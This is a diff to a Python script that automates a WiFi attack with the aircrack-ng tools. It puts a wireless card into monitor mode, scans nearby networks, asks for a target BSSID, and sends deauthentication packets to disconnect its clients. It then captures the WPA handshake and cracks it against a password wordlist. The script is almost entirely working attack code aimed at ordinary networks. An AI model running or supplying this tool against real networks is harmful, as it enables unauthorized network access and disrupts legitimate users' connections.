@@ -21,9 +21,9 @@ else:
 # asks for wireless card to apply monitor mode on it
 wireless_card = input("Enter your wireless card: ")
 
-# turns wireless card into monitor mod
-mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
-system(mon0)
+airmonkill = "airmon-ng check kill"
+airmongstart = "airmon-ng start "+wireless_card
+wireless_card = wireless_card+"mon"
 
 csvpath = fullPath+"/"+directory_name
 # runs a scan with airodump-ng to get available wifi
@@ -38,9 +38,6 @@ with open(csvpath+'-01.csv', 'r') as csvfile:
 
 # asks for your target's bssid
 bssid = input("Enter the BSSID of the network you want to crack: ")
-
-#ugly fix but takes care of the extra space I get from reading out the csv TODO make pretty
-#bssid = " "+bssid
 
 channel = None
 mac_address = None
@@ -61,22 +58,19 @@ print ("Airodump will start, in the meanwhile, run deauth.py in a new terminal")
 sleep(2)
 
 # starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
-airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, mac_address, csvpath+"_handshake", wireless_card)
+airodump2 = 'timeout 15s airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, mac_address, csvpath+"_handshake", wireless_card)
 airodump_subprocess = subprocess.Popen(airodump2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
 sleep(5)
 # Deauthenticate the access point
-deauth = "aireplay-ng -0 {0} -a {1} -c {2} {3}".format(5,bssid,mac_address,wireless_card)
-deauth_subprocess = subprocess.Popen(deauth, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
-#Popen(deauth, shell=True)
+deauth = "aireplay-ng -0 {0} -a {1} {2}".format(5,mac_address,wireless_card)
+system(deauth)
 
-os.killpg(os.getpgid(deauth_subprocess.pid), signal.SIGTERM)
-sleep(10)
-os.killpg(os.getpgid(airodump_subprocess.pid), signal.SIGTERM)
-sleep(2)
+sleep(15)
 print("Cracking the handshake with aircrack-ng is starting...")
 
 # 'Aircrack-ng' parameters set
-#wordlist = input("Specify the path to your wordlist dictionary: ")
+wordlist = input("Specify the path to your wordlist dictionary: ")
 print ("This could take a while according to the wordlist you are using, so be patient!")
-crack = 'aircrack-ng -a 2 {0} -w {1} '.format(csvpath+"_handshake-01.cap", "/usr/share/wordlists/metasploit/password.lst")
+crack = 'aircrack-ng -a 2 {0} -w {1} '.format(csvpath+"_handshake-01.cap", wordlist)
 system(crack)
+os.killpg(os.getpgid(airodump_subprocess.pid), signal.SIGTERM)
